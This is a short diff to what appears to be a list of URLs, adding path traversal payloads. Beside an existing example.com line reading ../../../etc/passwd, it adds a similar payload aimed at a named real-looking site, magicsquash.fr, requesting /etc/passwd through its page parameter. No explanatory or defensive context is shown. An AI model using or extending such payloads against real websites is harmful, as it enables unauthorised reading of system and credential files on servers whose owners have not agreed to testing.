@@ -1,1 +1,3 @@
 http://example.com/index.php?page=../../../etc/passwd
+https://magicsquash.fr/pages/index.php?page=contact.php
+https://magicsquash.fr/pages/index.php?page=/../../../../../etc/passwd
